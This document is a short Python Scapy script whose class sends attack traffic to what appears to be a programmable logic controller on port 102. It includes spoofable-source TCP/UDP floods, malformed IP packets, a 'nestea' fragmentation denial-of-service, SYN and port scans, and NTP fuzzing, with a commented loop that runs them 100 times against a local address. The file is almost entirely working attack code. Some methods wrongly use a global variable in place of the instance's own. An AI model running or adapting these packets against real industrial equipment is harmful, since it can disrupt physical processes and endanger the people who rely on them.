from scapy.all import *

class PLCScapyPacket:
    def __init__(self, source_ip, destination_ip, source_port, destination_port):
        self.source_ip = source_ip
        self.destination_ip = destination_ip
        self.source_port = source_port
        self.destination_port = destination_port

    def packet_send_protocol(self, protocol_type,count):
        try:
            if protocol_type == "TCP":
                send(IP(src=str(self.source_ip), dst=str(self.destination_ip)) /
                     TCP(sport=int(self.source_port),
                         dport=int(self.destination_port)), count=count)



            elif protocol_type == "UDP":
                send(IP(src=str(self.source_ip), dst=str(self.destination_ip)) /
                     UDP(sport=int(self.source_port),
                         dport=int(self.destination_port)), count=count)

        except ValueError:
            print("Error")

    #malfprmed_packets
    def malformed_packets(self,count):
        send(IP(dst=str(destination_ip), ihl=2, version=3) / ICMP(),count = count)
    #nestea_packets
    def nestea_attack(self,count):
        send(IP(dst=str(destination_ip), id=42, flags="MF") / UDP() / ("X" * 10),count = count)
    #syn scan
    def syn_Scans(self,count):
        send(IP(dst=str(destination_ip)) /
             TCP(sport=int(self.source_port), dport=int(self.destination_port), flags="S"),count = count)
    #fuzzing
    def fuzzing(self,count):
        send(IP(dst=str(destination_ip)) / fuzz(UDP() / NTP(version=4)), loop=1,count = count)

    #port scanning
    def port_scan(self):
        res, unans = sr(IP(dst=str(destination_ip))
                        / TCP(flags="S", dport=(1, 1024)))

# Usage example
source_ip = '192.168.0.2'
destination_ip = '192.168.0.1'
source_port = 80
destination_port = 102

plc_packet_send = PLCScapyPacket(source_ip, destination_ip, source_port, destination_port)


#RUN
'''

try:
    for i in range(0,100):
        print(i)
        plc_packet_send.malformed_packets(1)
        plc_packet_send.nestea_attack(1)
        plc_packet_send.syn_Scans(1)
        plc_packet_send.fuzzing(1)

except ValueError:
    print("Error")

'''